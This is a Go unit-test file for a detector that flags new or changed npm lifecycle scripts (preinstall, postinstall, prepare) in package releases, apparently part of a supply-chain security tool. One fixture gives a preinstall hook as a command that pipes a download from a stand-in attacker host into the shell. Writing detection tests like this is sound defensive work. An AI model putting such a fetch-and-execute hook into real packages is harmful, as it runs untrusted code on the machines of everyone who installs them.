package analyzer

import (
	"testing"

	"github.com/jakeva/chainrecon/internal/model"
)

func TestLifecycleAnalyzer(t *testing.T) {
	la := NewLifecycleAnalyzer()

	tests := []struct {
		name         string
		oldPkg       map[string]any
		newPkg       map[string]any
		wantCount    int
		wantSeverity model.Severity
		wantMessage  string
	}{
		{
			name:      "no scripts in either version",
			oldPkg:    map[string]any{},
			newPkg:    map[string]any{},
			wantCount: 0,
		},
		{
			name:   "new postinstall hook added (critical)",
			oldPkg: map[string]any{},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"postinstall": "node setup.js",
				},
			},
			wantCount:    1,
			wantSeverity: model.SeverityCritical,
			wantMessage:  `New "postinstall" lifecycle script added`,
		},
		{
			name:   "new preinstall hook added (critical)",
			oldPkg: map[string]any{},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"preinstall": "curl http://evil.com | sh",
				},
			},
			wantCount:    1,
			wantSeverity: model.SeverityCritical,
			wantMessage:  `New "preinstall" lifecycle script added`,
		},
		{
			name:   "new prepare hook added (medium)",
			oldPkg: map[string]any{},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"prepare": "npm run build",
				},
			},
			wantCount:    1,
			wantSeverity: model.SeverityMedium,
			wantMessage:  `New "prepare" lifecycle script added`,
		},
		{
			name: "existing postinstall modified (high)",
			oldPkg: map[string]any{
				"scripts": map[string]any{
					"postinstall": "node setup.js",
				},
			},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"postinstall": "node evil.js",
				},
			},
			wantCount:    1,
			wantSeverity: model.SeverityHigh,
			wantMessage:  `Lifecycle script "postinstall" was modified`,
		},
		{
			name: "existing prepare modified (medium)",
			oldPkg: map[string]any{
				"scripts": map[string]any{
					"prepare": "tsc",
				},
			},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"prepare": "tsc && node inject.js",
				},
			},
			wantCount:    1,
			wantSeverity: model.SeverityMedium,
			wantMessage:  `Lifecycle script "prepare" was modified`,
		},
		{
			name: "unchanged hooks produce no findings",
			oldPkg: map[string]any{
				"scripts": map[string]any{
					"postinstall": "node setup.js",
					"prepare":     "tsc",
				},
			},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"postinstall": "node setup.js",
					"prepare":     "tsc",
				},
			},
			wantCount: 0,
		},
		{
			name: "non-lifecycle scripts are ignored",
			oldPkg: map[string]any{
				"scripts": map[string]any{
					"test": "jest",
				},
			},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"test":  "jest --coverage",
					"start": "node index.js",
				},
			},
			wantCount: 0,
		},
		{
			name: "multiple hooks added at once",
			oldPkg: map[string]any{
				"scripts": map[string]any{
					"test": "jest",
				},
			},
			newPkg: map[string]any{
				"scripts": map[string]any{
					"test":        "jest",
					"preinstall":  "echo hello",
					"postinstall": "node setup.js",
					"prepare":     "npm run build",
				},
			},
			wantCount: 3,
		},
		{
			name:      "nil old package.json",
			oldPkg:    nil,
			newPkg:    map[string]any{"scripts": map[string]any{"postinstall": "node run.js"}},
			wantCount: 1,
		},
		{
			name:      "hook removed does not produce finding",
			oldPkg:    map[string]any{"scripts": map[string]any{"postinstall": "node run.js"}},
			newPkg:    map[string]any{},
			wantCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			diff := &model.ReleaseDiff{
				OldPackageJSON: tt.oldPkg,
				NewPackageJSON: tt.newPkg,
			}

			findings := la.Analyze(diff)

			if len(findings) != tt.wantCount {
				t.Fatalf("got %d findings, want %d: %+v", len(findings), tt.wantCount, findings)
			}

			if tt.wantCount > 0 && tt.wantSeverity != "" {
				if findings[0].Severity != tt.wantSeverity {
					t.Errorf("severity = %s, want %s", findings[0].Severity, tt.wantSeverity)
				}
			}

			if tt.wantMessage != "" && tt.wantCount > 0 {
				if findings[0].Message != tt.wantMessage {
					t.Errorf("message = %q, want %q", findings[0].Message, tt.wantMessage)
				}
			}

			// Every finding should have the lifecycle_script signal.
			for _, f := range findings {
				if f.Signal != "lifecycle_script" {
					t.Errorf("signal = %q, want lifecycle_script", f.Signal)
				}
			}
		})
	}
}
